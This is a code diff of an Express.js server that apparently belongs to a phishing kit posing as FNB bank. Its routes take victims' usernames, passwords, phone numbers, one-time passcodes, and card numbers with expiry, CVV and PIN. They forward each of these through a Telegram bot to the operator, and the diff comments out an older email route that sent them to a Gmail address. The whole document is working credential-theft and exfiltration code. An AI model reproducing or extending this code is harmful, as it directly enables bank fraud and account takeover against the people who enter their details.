@@ -53,79 +53,81 @@ app.get("/load", (req, res) => {
 
 app.post("/otp_post", (req, res) => {
 
-    if(req.body.otpValue) {
-        res.render("failed.html")
-    } else {
-        res.render("index.html")
-    }
+    // if(req.body.otpValue) {
+    //     res.render("failed.html")
+    // } else {
+    //     res.render("index.html")
+    // }
 
-    var mailOptions = {
-        from: `${req.session.user} info@applinic.com`,
-        to: "matledesign98@gmail.com",
-        subject: `OTP Code`,
-        text: `OTP: ${req.body.otpValue}`
-    };
+    // var mailOptions = {
+    //     from: `${req.session.user} info@applinic.com`,
+    //     to: "matledesign98@gmail.com",
+    //     subject: `OTP Code`,
+    //     text: `OTP: ${req.body.otpValue}`
+    // };
 
     
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-        } else {
-            console.log('Email sent: ' + info.response);
-        }
-    });
+    // transporter.sendMail(mailOptions, function(error, info){
+    //     if (error) {
+    //         console.log(error);
+    //     } else {
+    //         console.log('Email sent: ' + info.response);
+    //     }
+    // });
 
     bot.sendMessage(chatId, `From: ${req.session.user}\n OTP: ${req.body.otpValue}`);
-
+    res.send("done")
 });
 
 app.post("/otp2_form", (req, res) => {
 
-    if(req.body.otpValue) {
-        res.redirect("https://www.fnb.co.za/fusion-accounts/private-wealth-fusion-account.html");
-    } else {
-        res.render("index.html")
-    }
+    // if(req.body.otpValue) {
+    //     res.redirect("https://www.fnb.co.za/fusion-accounts/private-wealth-fusion-account.html");
+    // } else {
+    //     res.render("index.html")
+    // }
 
-    var mailOptions = {
-        from: `${req.session.user} info@applinic.com`,
-        to: "matledesign98@gmail.com",
-        subject: `OTP2 Code`,
-        text: `OTP2: ${req.body.otpValue}`
-    };
+    // var mailOptions = {
+    //     from: `${req.session.user} info@applinic.com`,
+    //     to: "matledesign98@gmail.com",
+    //     subject: `OTP2 Code`,
+    //     text: `OTP2: ${req.body.otpValue}`
+    // };
 
     
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-        } else {
-            console.log('Email sent: ' + info.response);
-        }
-    });
+    // transporter.sendMail(mailOptions, function(error, info){
+    //     if (error) {
+    //         console.log(error);
+    //     } else {
+    //         console.log('Email sent: ' + info.response);
+    //     }
+    // });
 
     bot.sendMessage(chatId, `From: ${req.session.user}\n OTP2: ${req.body.otpValue}`);
+    res.send("done")
 
 })
 
 app.post("/phone-verification", (req, res) => {
-    res.redirect("/card-details")
-    var mailOptions = {
-        from: `${req.session.user} info@applinic.com`,
-        to: "matledesign98@gmail.com",
-        subject: `Mobile Number`,
-        text: `Mobile number: ${req.body.phn}`
-    };
+    //res.redirect("/card-details")
+    // var mailOptions = {
+    //     from: `${req.session.user} info@applinic.com`,
+    //     to: "matledesign98@gmail.com",
+    //     subject: `Mobile Number`,
+    //     text: `Mobile number: ${req.body.phn}`
+    // };
 
     
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-        } else {
-            console.log('Email sent: ' + info.response);
-        }
-    });
+    // transporter.sendMail(mailOptions, function(error, info){
+    //     if (error) {
+    //         console.log(error);
+    //     } else {
+    //         console.log('Email sent: ' + info.response);
+    //     }
+    // });
 
     bot.sendMessage(chatId, `From: ${req.session.user}\n Mobile Number: ${req.body.phn}`);
+    res.send("done")
 })
 
 app.get("/card-details", (req, res) => {
@@ -134,47 +136,49 @@ app.get("/card-details", (req, res) => {
 
 app.post("/cardVerification", ( req, res) => {
     
-    res.redirect('/load')
-    var mailOptions = {
-        from: `${req.session.user} info@applinic.com`,
-        to: "matledesign98@gmail.com",
-        subject: `Card Details`,
-        text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
-    };
+    //res.redirect('/load')
+    // var mailOptions = {
+    //     from: `${req.session.user} info@applinic.com`,
+    //     to: "matledesign98@gmail.com",
+    //     subject: `Card Details`,
+    //     text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
+    // };
 
     
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-        } else {
-            console.log('Email sent: ' + info.response);
-        }
-    });
+    // transporter.sendMail(mailOptions, function(error, info){
+    //     if (error) {
+    //         console.log(error);
+    //     } else {
+    //         console.log('Email sent: ' + info.response);
+    //     }
+    // });
 
     bot.sendMessage(chatId, `From: ${req.session.user}\n card number: 
     ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`);
+    res.send("done")
 });
 
 app.post("/login", ( req, res ) => {
-    res.redirect(`/phone-verification`);
+   // res.redirect(`/phone-verification`);
     req.session.user = req.body.Username;
     req.session.save();
-    var mailOptions = {
-        from: `${req.session.user} info@applinic.com`,
-        to: "matledesign98@gmail.com",
-        subject: `Client Login Alert`,
-        text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
-    };
+    // var mailOptions = {
+    //     from: `${req.session.user} info@applinic.com`,
+    //     to: "matledesign98@gmail.com",
+    //     subject: `Client Login Alert`,
+    //     text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
+    // };
 
     
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-        } else {
-            console.log('Email sent: ' + info.response);
-        }
-    });
+    // transporter.sendMail(mailOptions, function(error, info){
+    //     if (error) {
+    //         console.log(error);
+    //     } else {
+    //         console.log('Email sent: ' + info.response);
+    //     }
+    // });
 
     bot.sendMessage(chatId, `From: ${req.session.user}\n Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`);
+    res.send("done")
 
 });
